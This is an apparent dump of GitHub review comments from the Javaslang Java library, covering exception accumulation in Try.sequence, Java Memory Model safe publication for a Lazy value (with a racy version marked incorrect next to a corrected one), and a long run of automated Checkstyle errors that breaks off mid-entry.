    "Abnaxos": "That looks like a very reasonable approach which leaves it open to the user how to proceed with multiple exceptions (handling each of them separately, reducing them to one via addSuppressed(), whatever). I can also implement this one, I'm fine with that.\nAlso, I think a clear warning that sequence() / traverse() may discard exceptions silently with a pointer to the new accumulate() variants in the Javadoc would be appropriate.. You cannot accumulate several Throwables using the cause:\n\nIn any scenario involving multiple Trys, the exceptions are probably not causally related, as they probably originate from multiple not directly related operations that have failed, possibly for completely different reasons. Claiming exception 1 was the cause for exception 2 would be untrue.\nThere may already be a cause (probably, actually), in which case initCause() will throw.\n\nBut yes, maybe it's better to have people do it manually:\njava\nv.filter(Try::isFailure).map(Try::getCause).reduceLeftOption((l, r) -> {\n  l.addSuppressed(r);\n  return l;\n}).forEach(e -> {\n  // handle e\n});\n(Or whatever fits the situation). A more or less real-world example, cat in Java:\njava\npublic static void main(String[] args) throws Exception {\n  Try<String> concatenated = Try.sequence(Vector.of(args)\n      .map(Paths::get)\n      .map(p -> Try.of(() -> Files.readString(p))))\n      .map(s -> s.reduceLeft((l, r) -> l + r));\n}\nThis will concatenate the contents of all the files given, the result is a Try<String>. If several files couldn't be found, the Try will currently contain only the first FileNotFoundException, the others are discarded. You should never discard exceptions.\nNow I think, we have to align our understanding of suppressed exceptions. Javadoc of addSuppressed():\n\nNote that when one exception causes [link to initCause()] another exception, the first exception is usually caught and then the second exception is thrown in response. In other words, there is a causal connection between the two exceptions. In contrast, there are situations where two independent exceptions can be thrown in sibling code blocks, in particular in the try block of a try-with-resources statement and the compiler-generated finally block which closes the resource. In these situations, only one of the thrown exceptions can be propagated. In the try-with-resources statement, when there are two such exceptions, the exception originating from the try block is propagated and the exception from the finally block is added to the list of exceptions suppressed by the exception from the try block. As an exception unwinds the stack, it can accumulate multiple suppressed exceptions.\n\nSo, in contrast to initCause, there is not necessarily a causal relationship between suppressed exceptions, as in the cat example. I might be wrong, but this is my understanding of the above paragraph.\nBecause I can only throw one exception, there are two things I can do if more than one file couldn't be found:\n\n(before Java7) throw some MultipleErrorsException\n(since Java7) throw one exception and record the other exceptions as suppressed\n\nMy patch implements the latter behaviour. It's disputable whether it does it in the right way, but IMHO, there should be an easy way to achieve this. It throws the first FileNotFoundException and amends: \"BTW, these other files also could't be found\" by attaching them as a suppressed exceptions, because there can be only one thrown exception.\nThe other aspect of the patch (requireNonNull) does the same thing, but with different weighting. It considers the illegal use of the API as more important, so it throws the NullPointerException. But if the Try is a failure, there is is exception, that was thrown before, which cannot be thrown anymore, because there was a more important error during error handling \u2192 it's attached to the NPE as a suppressed exception, so it doesn't get lost.\nNote that in Scala 2.12 this (relatively) new mechanism of suppressing exceptions is completely ignored. I'm doubt we can just have a look at how Scala does it. Scala also doesn't do any try-with-resources (yet).. ",
    "stancalau": "Are these sections needed if there is no new declaration wihtin?\n. Wrong place to put my comment, I was referring to the section above the if.\n. ",
    "shipilev": "No, there is no such thing as \"implicit volatile\". It's just your volatile Supplier is guarantees you always read the correct value.\nFrom the JMM standpoint, you have to argue if there exists an execution that has this relation: read(supplier):null --PO/HB--> read(value):null? It does not, because read(supplier):null is always in SO (and therefore in SW) after write(supplier, null), and write(value, SOME_VALUE) --PO/HB--> write(supplier, null). If there is indeed an execution that does read(value):null, then it violates HB consistency. \nSome might think the whole case looks like the usual publishing piggybacking, regardless that we store the null into supplier:\nThread 1:\n  store A;\n  volatile store B; \nThread 2:\n  volatile read B // observes the value from store B\n  read A; // guaranteed to observe store A\nGlossary: read(field):val -- reading value \"val\" from \"field\"; write(field, val) -- writing value \"val\" to \"field\"; SO -- synchronization order; SW -- synchronizes-with order; PO -- program order; HB - happens-before order.\nI would refer to https://shipilev.net/blog/2014/safe-public-construction/ for tests that actually fail without volatile.\n. I am losing track what version we discuss. This one is incorrect:\n```\nprivate volatile Supplier<? extends T> supplier;  // dropping volatile here makes it even worse\nprivate T value;\n@Override\npublic T get() {\n    if (value == null) { // (3) <--- non-volatile read, this is the data race\n        synchronized (this) {\n            if (supplier != null) {\n                value = supplier.get(); // (1)\n                supplier = null; // (2)\n            }\n        }\n    }\n    return value; // (4)\n}\n```\nIn here, this is a correct execution: (1) write(value, SOME_VALUE) --PO/HB --> (2) write(supplier, null)  ...nothing... (3) read(value):!null --PO/HB--> (4) read(value):null. Oopsies. Even if you luckily observe the non-null value, there is still no happens before between the stores to the value and the reads from the value, e.g. you just made the unsafe publication.\nYou have to read supplier (and null-check it) before reading value to get happens-before through supplier write/read. This one is correct:\n```\nprivate volatile Supplier<? extends T> supplier; // should be volatile!\nprivate T value;\n@Override\npublic T get() {\n    if (supplier != null) { // (3) <--- volatile read\n        synchronized (this) {\n            if (supplier != null) {\n                value = supplier.get(); // (1)\n                supplier = null; // (2)\n            }\n        }\n    }\n    return value; // (4)\n}\n```\nAll executions that read null in (3) are reading actual value in (4), because: (1) write(value, SOME_VALUE) --PO/HB--> (2) write(supplier, null) --SW/HB--> (3) read(supplier):null --PO/HB--> (4) read(value):SOME_VALUE. If (4) reads something else than SOME_VALUE, then it violates HB consistency (assuming there are no other writes to value anywhere). Also, all the writes to the value piggyback on the same happens-before.\nIt all boils down to a simple \"safe publication\" rule: one thread does \"writes, writes, writes --> VOLATILE WRITE (release)\", the other thread does \"VOLATILE READ (acquire) THAT OBSERVES THE VOLATILE WRITE VALUE --> reads, reads, reads\". No need to think deeply about the JMM if you follow this rule. Everything goes downhill if you start coming up with weird notions like \"effectively volatile\", etc.\n. > In other words your version is not deterministic and may produce unexpected results.\nWorse than that: reading a naked value is reading via the race. There is no guarantees that something that you have written into the value fields themselves is visible to the readers of value reference. Should read supplier first to get \"acquire\" part.\n. > In the second case the write to value is visible. Then we are finished and can safely return it.\nDANGEROUSLY WRONG. Let me try to explain this again. You cannot safely return something you have read off the race, you have just constructed the unsafe publication. Even if you have observed the reference to value, you are not guaranteed to observe the transitive reads correctly, you have to piggyback on happens-before for this. And to piggy-back on all paths, you have to read supplier on all paths.\nIn other words, with value == null shortcut, you have just exposed your users to this (I am speculating about the syntax here, sorry, in hurry):\n```\n  class MyObject {\n    int x; \n    MyObject(int x) { this.x = x; }\n  }\nstatic final Lazy lazy = Lazy.with(() -> new MyObject(42));\n  ...\n  MyObject o = lazy.get(); // discover some other thread had already initalized\n  assert (o.x == 42); // intermittently FAILS, because MyObject within Lazy was unsafely published\n```\nOr, to repeat myself from this thread:\nIt all boils down to a simple \"safe publication\" rule: one thread does \"writes, writes, writes --> VOLATILE WRITE (release)\", the other thread does \"VOLATILE READ (acquire) THAT OBSERVES THE VOLATILE WRITE VALUE --> reads, reads, reads\". No need to think deeply about the JMM if you follow this rule. Everything goes downhill if you start coming up with weird notions like \"effectively volatile\", racy shortcuts, etc.\nSee also this example: https://shipilev.net/blog/2016/close-encounters-of-jmm-kind/#pitfall-semi-sync\n. ",
    "pfijalki": "I used provided formatter, and doublechecked it before submitting. Just thought I'll add this byt the way (previous code was not compatible with formatter provided) - should I remove this change ?\n. I will revert all eq changes made\n. If I'd remove this I cannot add Hashset::of to my pretty generators map, because HashSet::of is not recognizable as a functional interface\n. ",
    "sputnikci": "[Checkstyle] ERROR: More than 7 parameters (found 9).\n. [Checkstyle] ERROR: More than 7 parameters (found 11).\n. [Checkstyle] ERROR: More than 7 parameters (found 13).\n. [Checkstyle] ERROR: More than 7 parameters (found 15).\n. [Checkstyle] ERROR: More than 7 parameters (found 17).\n. [Checkstyle] ERROR: More than 7 parameters (found 19).\n. [Checkstyle] ERROR: More than 7 parameters (found 21).\n. [Checkstyle] ERROR: 'protected' modifier out of order with the JLS suggestions.\n. [Checkstyle] ERROR: '>' is followed by whitespace.\n. [Checkstyle] ERROR: Variable 'nextValue' explicitly initialized to '0' (default value for its type).\n. [Checkstyle] ERROR: '>' is followed by whitespace.\n. [Checkstyle] ERROR: 'static' modifier out of order with the JLS suggestions.\n. [Checkstyle] ERROR: 'static' modifier out of order with the JLS suggestions.\n. [Checkstyle] ERROR: Unused import - javaslang.collection.Stream.\n. [Checkstyle] ERROR: Unused import - javaslang.collection.Stream.\n. [Checkstyle] ERROR: Name 'K2' must match pattern '^[A-Z]$'.\n. [Checkstyle] ERROR: Name 'V2' must match pattern '^[A-Z]$'.\n. [Checkstyle] ERROR: Name 'K2' must match pattern '^[A-Z]$'.\n. [Checkstyle] ERROR: Name 'V2' must match pattern '^[A-Z]$'.\n. [Checkstyle] ERROR: Name 'K2' must match pattern '^[A-Z]$'.\n. [Checkstyle] ERROR: Name 'V2' must match pattern '^[A-Z]$'.\n. [Checkstyle] ERROR: Name 'K2' must match pattern '^[A-Z]$'.\n. [Checkstyle] ERROR: Name 'V2' must match pattern '^[A-Z]$'.\n. [Checkstyle] ERROR: Name 'K2' must match pattern '^[A-Z]$'.\n. [Checkstyle] ERROR: Name 'V2' must match pattern '^[A-Z]$'.\n. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: '>' is followed by whitespace.. [Checkstyle] ERROR: '>' is followed by whitespace.. [Checkstyle] ERROR: '>' is followed by whitespace.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Utility classes should not have a public or default constructor.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T7' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T7' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Utility classes should not have a public or default constructor.. [Checkstyle] ERROR: Each variable declaration must be in its own statement.. [Checkstyle] ERROR: Each variable declaration must be in its own statement.. [Checkstyle] ERROR: Assignment of parameter 'forest' is not allowed.. [Checkstyle] ERROR: Assignment of parameter 'tree' is not allowed.. [Checkstyle] ERROR: Assignment of parameter 'forest' is not allowed.. [Checkstyle] ERROR: Each variable declaration must be in its own statement.. [Checkstyle] ERROR: Variable 'root' must be private and have accessor methods.. [Checkstyle] ERROR: Variable 'children' must be private and have accessor methods.. [Checkstyle] ERROR: '>' is followed by whitespace.. [Checkstyle] ERROR: 'protected' modifier out of order with the JLS suggestions.. [Checkstyle] ERROR: 'protected' modifier out of order with the JLS suggestions.. [Checkstyle] ERROR: 'protected' modifier out of order with the JLS suggestions.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: '>' is followed by whitespace.. [Checkstyle] ERROR: '>' is followed by whitespace.. [Checkstyle] ERROR: '>' is followed by whitespace.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Assignment of parameter 'n' is not allowed.. [Checkstyle] ERROR: Name 'K2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Variable 'delegate' must be private and have accessor methods.. [Checkstyle] ERROR: '{' at column 42 should have line break after.. [Checkstyle] ERROR: '{' at column 33 should have line break after.. [Checkstyle] ERROR: '>' is followed by whitespace.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T7' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T7' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T8' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T7' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Redundant import from the same package - javaslang.control.Option.. [Checkstyle] ERROR: Redundant import from the same package - javaslang.control.Try.. [Checkstyle] ERROR: Duplicate import to line 15 - javaslang.concurrent.Future.. [Checkstyle] ERROR: '{' is not followed by whitespace.. [Checkstyle] ERROR: '}' is not preceded with whitespace.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T7' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: '{' at column 47 should have line break after.. [Checkstyle] ERROR: '{' at column 47 should have line break after.. [Checkstyle] ERROR: '{' at column 43 should have line break after.. [Checkstyle] ERROR: Don't use trailing comments.. [Checkstyle] ERROR: '{' at column 43 should have line break after.. [Checkstyle] ERROR: Don't use trailing comments.. [Checkstyle] ERROR: '{' at column 43 should have line break after.. [Checkstyle] ERROR: Don't use trailing comments.. [Checkstyle] ERROR: '{' at column 43 should have line break after.. [Checkstyle] ERROR: Don't use trailing comments.. [Checkstyle] ERROR: '{' at column 43 should have line break after.. [Checkstyle] ERROR: Don't use trailing comments.. [Checkstyle] ERROR: '{' at column 43 should have line break after.. [Checkstyle] ERROR: Don't use trailing comments.. [Checkstyle] ERROR: '{' at column 43 should have line break after.. [Checkstyle] ERROR: Don't use trailing comments.. [Checkstyle] ERROR: '{' at column 43 should have line break after.. [Checkstyle] ERROR: Don't use trailing comments.. [Checkstyle] ERROR: '{' at column 43 should have line break after.. [Checkstyle] ERROR: Don't use trailing comments.. [Checkstyle] ERROR: Assignment of parameter 'size' is not allowed.. [Checkstyle] ERROR: Assignment of parameter 'size' is not allowed.. [Checkstyle] ERROR: Assignment of parameter 'root' is not allowed.. [Checkstyle] ERROR: Assignment of parameter 'index' is not allowed.. [Checkstyle] ERROR: '{' at column 59 should have line break after.. [Checkstyle] ERROR: Assignment of parameter 'index' is not allowed.. [Checkstyle] ERROR: '>' is followed by whitespace.. [Checkstyle] ERROR: Assignment of parameter 'index' is not allowed.. [Checkstyle] ERROR: Unused import - javaslang.API.Array.. [Checkstyle] ERROR: '{' at column 68 should have line break after.. [Checkstyle] ERROR: Only one statement per line allowed.. [Checkstyle] ERROR: Fields and methods should be before inner classes.. [Checkstyle] ERROR: '{' at column 40 should have line break after.. [Checkstyle] ERROR: '{' at column 40 should have line break after.. [Checkstyle] ERROR: '{' at column 41 should have line break after.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T7' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T8' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T7' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T7' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T8' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T7' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T7' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T8' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'Function' must match pattern '^[a-z][a-zA-Z0-9]*$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'Function' must match pattern '^[a-z][a-zA-Z0-9]*$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'Function' must match pattern '^[a-z][a-zA-Z0-9]*$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'Function' must match pattern '^[a-z][a-zA-Z0-9]*$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'Function' must match pattern '^[a-z][a-zA-Z0-9]*$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'Function' must match pattern '^[a-z][a-zA-Z0-9]*$'.. [Checkstyle] ERROR: Name 'T1' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T2' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T3' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T4' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T5' must match pattern '^[A-Z]$'.. [Checkstyle] ERROR: Name 'T6' must match pattern 